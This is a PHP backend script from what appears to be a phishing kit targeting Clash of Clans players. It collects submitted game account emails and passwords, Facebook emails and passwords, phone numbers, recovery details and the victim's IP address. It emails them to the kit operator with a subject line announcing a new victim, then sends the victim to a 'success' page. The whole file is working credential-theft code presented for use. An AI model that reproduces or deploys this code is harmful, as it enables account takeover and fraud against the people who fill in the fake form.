<?php

$username = $_POST['username'];
$mail = $_POST['mail'];
$pw = $_POST['pw'];
$hp = $_POST ['hp'];
$th = $_POST['th'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$xp = $_POST['xp'];
$rec = $_POST['rec'];
$ip = $_SERVER['REMOTE_ADDR'];

$ripalsubjek = "SI $username COC DATANG";
include '../Email.php';
$ripalborder = <<<EOD
<br><hr><br>
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b>$th</b></font></div> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><img src="https://3.bp.blogspot.com/-97C-Q5tCs9s/Wk3cVELCx0I/AAAAAAAAAMg/4vDrPtX3_oww7i1ZHAg_YHUMHYCVAsYWgCLcBGAs/s320/ripal.png"></font></div> </center>
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b>AMANIN</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Email  = $mail</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Pass = $pw</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Email Facebook = $user</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Pass = $pass</b></font></div> </center> <div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Hp = $hp</b></font></div> </center>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>TownHall = $th</b></font></div> </center>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Xp = $xp</b></font></div> </center>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Recovery = $rec</b></font></div> </center>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b>Ip = $ip</b></font></div> </center>
 <center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b>© Copyright 2018 UHUINFO.COM</b></font></div> </center>
EOD;
$headers .= "Content-type: text/html\r\n";
$success = mail($ripalsendemail, $ripalsubjek, $ripalborder, $headers);
?>
<?php $random = rand(100,5000); ?>
<script LANGUAGE="JavaScript">
window.location="../Berhasil/";
</script>
<?php session_start(); session_destroy(); exit; ?>